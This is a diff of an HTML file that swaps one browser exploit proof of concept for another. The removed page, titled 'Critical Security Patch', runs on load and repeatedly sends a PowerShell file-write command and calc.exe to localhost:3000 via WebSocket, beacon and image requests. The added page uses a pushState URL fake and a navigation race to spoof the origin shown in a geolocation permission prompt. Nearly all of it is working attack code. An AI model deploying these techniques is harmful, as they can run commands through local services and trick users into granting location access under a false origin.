@@ -1,50 +1,105 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-    <title>Critical Security Patch</title>
+<meta charset="utf-8">
+<title>Geolocation Origin Desync PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
+}
+
+button {
+  font-size: 15px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
+}
+
+#panel {
+  display: none;
+  max-width: 420px;
+  margin: 80px auto;
+  background: #fff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+  text-align: center;
+}
+
+.notice {
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
+}
+</style>
 </head>
-<body style="background:black; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
-    <h1>SYSTEM ISOLATION BREACH TEST</h1>
-    <div id="logs" style="text-align:left; display:inline-block; width:80%;"></div>
 
-    <script>
-        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
-        
-        // Payload: Menulis file ke desktop menggunakan PowerShell
-        // Kami menggunakan PowerShell karena sangat kuat untuk membuktikan dampak RCE
-        const filePayload = 'powershell -Command "Set-Content -Path $env:USERPROFILE\\Desktop\\VULNERABLE.txt -Value \'THIS SYSTEM IS COMPROMISED VIA CHROME PNA BYPASS. DATE: \' (Get-Date)"';
-        const calcPayload = 'calc.exe';
+<body>
 
-        async function inject() {
-            const targets = ["127.0.0.1", "0.0.0.0", "localhost"];
-            
-            targets.forEach(ip => {
-                log(`Testing Shadowing on ${ip}...`);
+<div style="text-align:center; margin-top:60px;">
+  <button id="trigger">Start PoC</button>
+</div>
 
-                // 1. WebSocket Injection (Primary)
-                try {
-                    const ws = new WebSocket(`ws://${ip}:3000`);
-                    ws.onopen = () => {
-                        log(`[!] WS CONNECTED: Injecting txt file via ${ip}...`);
-                        ws.send(filePayload); // Kirim perintah tulis file
-                        ws.send(calcPayload); // Kirim perintah buka kalkulator
-                    };
-                } catch(e){}
+<div id="panel">
+  <h2>Request Location</h2>
+  <p>Tap the button below to request Geolocation permission.</p>
 
-                // 2. Beacon Injection (Secondary)
-                navigator.sendBeacon(`http://${ip}:3000/exec?cmd=${encodeURIComponent(filePayload)}`);
+  <button onclick="getLocation()">Get Location</button>
+  <p id="output">Location: -</p>
 
-                // 3. Image Backup
-                new Image().src = `http://${ip}:3000/exec?cmd=${encodeURIComponent(calcPayload)}`;
-            });
-        }
+  <div class="notice">
+    Demo only — observe origin shown in permission dialog
+  </div>
+</div>
 
-        window.onload = () => {
-            log("Starting exploit chain...");
-            inject();
-            // Loop untuk memastikan race condition menang
-            setInterval(inject, 10000);
-        };
-    </script>
+<script>
+const panel   = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const output  = document.getElementById('output');
+
+function getLocation() {
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      output.textContent =
+        `${pos.coords.latitude}, ${pos.coords.longitude}`;
+    },
+    () => {
+      output.textContent = 'Permission denied';
+    }
+  );
+}
+
+/*
+ * Step 1:
+ * Manipulate visible URL to a trusted-looking path
+ */
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
+
+/*
+ * Step 2:
+ * Trigger a navigation race shortly after permission flow starts
+ */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+parent.location = 'https://google.com:9090/#https://google.com:9090';
+      }, 80);
+    });
+  });
+});
+</script>
+
 </body>
 </html>
